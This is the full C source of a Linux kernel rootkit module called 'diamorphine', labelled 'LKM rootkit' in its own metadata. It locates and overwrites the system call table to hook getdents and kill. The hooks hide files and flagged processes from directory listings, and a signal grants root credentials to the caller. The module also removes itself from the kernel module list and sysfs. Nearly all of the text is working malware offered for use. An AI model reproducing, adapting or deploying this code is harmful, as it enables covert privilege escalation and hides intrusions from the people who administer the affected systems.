#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/unistd.h>
#include <asm/pgtable.h>
#include <linux/slab.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/sched.h>
#include <linux/fdtable.h>
#include <linux/fs.h>
#include <linux/proc_fs.h>

struct linux_dirent {
	unsigned long	d_ino;
	unsigned long	d_off;
	unsigned short	d_reclen;
	char		d_name[1];
};

static pte_t *pte;
static unsigned long *sys_call_table;
typedef asmlinkage int (*orig_getdents_t)(unsigned int, struct linux_dirent *,
	unsigned int);
typedef asmlinkage int (*orig_getdents64_t)(unsigned int,
	struct linux_dirent64 *, unsigned int);
typedef asmlinkage int (*orig_kill_t)(pid_t, int);
orig_getdents_t orig_getdents;
orig_getdents64_t orig_getdents64;
orig_kill_t orig_kill;

#ifdef __x86_64__
	#define START_MEM 0xffffffff81000000
	#define END_MEM 0xffffffff81fffffff //0xffffffffa2000000
#else
	#define START_MEM 0xc0000000
	#define END_MEM 0xd0000000
#endif
unsigned long *
get_syscall_table_bf(void)
{
	unsigned long *syscall_table = (unsigned long *)START_MEM;

	while (syscall_table[__NR_close] != (unsigned long)sys_close)
		syscall_table++;
	return syscall_table;
/*
	unsigned long *syscall_table;
	unsigned long int i;

	for (i = START_MEM; i < END_MEM; i += sizeof(void *)) {
		syscall_table = (unsigned long *)i;

		if (syscall_table[__NR_close] == (unsigned long)sys_close)
			return syscall_table;
	}
	return NULL;
*/
}

#define MAGIC_PREFIX "diamorphine"
struct task_struct *
find_task(pid_t pid)
{
	struct task_struct *p = current;
	for_each_process(p) {
		if (p->pid == pid)
			return p;
	}
	return NULL;
}

#define PF_INVISIBLE 0x10000000
int
is_invisible(pid_t pid)
{
	struct task_struct *task = find_task(pid);
	if (!task)
		return 0;
	if (task->flags & PF_INVISIBLE)
		return 1;
	return 0;
}

asmlinkage int
hacked_getdents64(unsigned int fd, struct linux_dirent64 __user *dirent,
	unsigned int count)
{
	int ret = orig_getdents64(fd, dirent, count); 
	unsigned short proc = 0;
	unsigned long off = 0;
	struct linux_dirent64 *dir, *kdirent, *prev = NULL;
	struct inode *d_inode;

	if (ret <= 0)
		return ret;

	kdirent = kzalloc(ret, GFP_KERNEL);
	if (kdirent == NULL)
		return ret;

	copy_from_user(kdirent, dirent, ret);

	d_inode = current->files->fdt->fd[fd]->f_dentry->d_inode;

	if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev)
		/*&& MINOR(d_inode->i_rdev) == 1*/)
		proc = 1;

	while (off < ret) {
		dir = (void *)kdirent + off;
		if ((!proc &&
		(memcmp(MAGIC_PREFIX, dir->d_name, strlen(MAGIC_PREFIX)) == 0))
		|| (proc &&
		is_invisible(simple_strtoul(dir->d_name, NULL, 10)))) {
			if (dir == kdirent) {
				ret -= dir->d_reclen;
				memmove(dir, (void *)dir + dir->d_reclen, ret);
				continue;
			}
			prev->d_reclen += dir->d_reclen;
		} else
		prev = dir;
		off += dir->d_reclen;
	}
	copy_to_user(dirent, kdirent, ret);
	kfree(kdirent);
	return ret;
}

asmlinkage int
hacked_getdents(unsigned int fd, struct linux_dirent __user *dirent,
	unsigned int count)
{
	int ret = orig_getdents(fd, dirent, count);
	unsigned short proc = 0;
	unsigned long off = 0;
	struct linux_dirent *dir, *kdirent, *prev = NULL;
	struct inode *d_inode;

	if (ret <= 0)
		return ret;	

	kdirent = kzalloc(ret, GFP_KERNEL);
	if (kdirent == NULL)
		return ret;

	copy_from_user(kdirent, dirent, ret);

	d_inode = current->files->fdt->fd[fd]->f_dentry->d_inode;

	if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev)
		/*&& MINOR(d_inode->i_rdev) == 1*/)
		proc = 1;

	while (off < ret) {
		dir = (void *)kdirent + off;
		if ((!proc && 
		(memcmp(MAGIC_PREFIX, dir->d_name, strlen(MAGIC_PREFIX)) == 0))
		|| (proc &&
		is_invisible(simple_strtoul(dir->d_name, NULL, 10)))) {
			if (dir == kdirent) {
				ret -= dir->d_reclen;
				memmove(dir, (void *)dir + dir->d_reclen, ret);
				continue;
			}
			prev->d_reclen += dir->d_reclen;
		} else
			prev = dir;
		off += dir->d_reclen;
	}
	copy_to_user(dirent, kdirent, ret);
	kfree(kdirent);
	return ret;
}

void
give_root(void)
{
	struct cred *newcreds;
	newcreds = prepare_creds();
	if (newcreds == NULL)
		return;	
	newcreds->uid = newcreds->gid = 0;
	newcreds->euid = newcreds->egid = 0;
	newcreds->suid = newcreds->sgid = 0;
	newcreds->fsuid = newcreds->fsgid = 0;
	commit_creds(newcreds);
}

static inline void
tidy(void)
{
//        kfree(THIS_MODULE->notes_attrs);
//        THIS_MODULE->notes_attrs = NULL;
        kfree(THIS_MODULE->sect_attrs);
        THIS_MODULE->sect_attrs = NULL;
//        kfree(THIS_MODULE->mkobj.mp);
//        THIS_MODULE->mkobj.mp = NULL;
//        THIS_MODULE->modinfo_attrs->attr.name = NULL;
//        kfree(THIS_MODULE->mkobj.drivers_dir);
//        THIS_MODULE->mkobj.drivers_dir = NULL;
}

static struct list_head *module_previous;
static short module_hidden = 0;
#define MODULE_NAME "diamorphine"
void module_show(void)
{
	list_add(&THIS_MODULE->list, module_previous);
	kobject_add(&THIS_MODULE->mkobj.kobj, THIS_MODULE->mkobj.kobj.parent,
			MODULE_NAME);
	module_hidden = 0;
}

void module_hide(void)
{
	module_previous = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);
	kobject_del(&THIS_MODULE->mkobj.kobj);
	list_del(&THIS_MODULE->mkobj.kobj.entry);
	module_hidden = 1;
}

#define SIGINVIS 31
#define SIGSUPER 64
#define SIGMODINVIS 63
asmlinkage int
hacked_kill(pid_t pid, int sig)
{
	struct task_struct *task;

	switch (sig) {
		case SIGINVIS:
			if ((task = find_task(pid)) == NULL)
				return -ESRCH;
			task->flags ^= PF_INVISIBLE;
			break;
		case SIGSUPER:
			give_root();
			break;
		case SIGMODINVIS:
			if (module_hidden) module_show();
			else module_hide();
			break;
		default:
			return orig_kill(pid, sig);
	}
	return 0;
}

static inline void
protect_memory(void)
{
	/* Restore kernel memory page protection */
	set_pte_atomic(pte, pte_clear_flags(*pte, _PAGE_RW));
}

static inline void
unprotect_memory(void)
{
	/* Unprotected kernel memory page containing for writing */
	set_pte_atomic(pte, pte_mkwrite(*pte));
}

static int __init
syshook_init(void)
{
        unsigned int level;

	sys_call_table = get_syscall_table_bf();
	if (!sys_call_table)
		return -1;

        pte = lookup_address((unsigned long)sys_call_table, &level);
        if (!pte)
                return -1;

	module_hide();
	tidy();

	orig_getdents = (orig_getdents_t)sys_call_table[__NR_getdents];
	orig_getdents64 = (orig_getdents64_t)sys_call_table[__NR_getdents64];
	orig_kill = (orig_kill_t)sys_call_table[__NR_kill];

	unprotect_memory();
	sys_call_table[__NR_getdents] = (unsigned long)hacked_getdents;
	sys_call_table[__NR_getdents64] = (unsigned long)hacked_getdents64;
	sys_call_table[__NR_kill] = (unsigned long)hacked_kill;
	protect_memory();

	return 0;
}

static void __exit
syshook_cleanup(void)
{
	unprotect_memory();
	sys_call_table[__NR_getdents] = (unsigned long)orig_getdents;
	sys_call_table[__NR_getdents64] = (unsigned long)orig_getdents64;
	sys_call_table[__NR_kill] = (unsigned long)orig_kill;
	protect_memory();
}

module_init(syshook_init);
module_exit(syshook_cleanup);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("m0nad");
MODULE_DESCRIPTION("LKM rootkit");
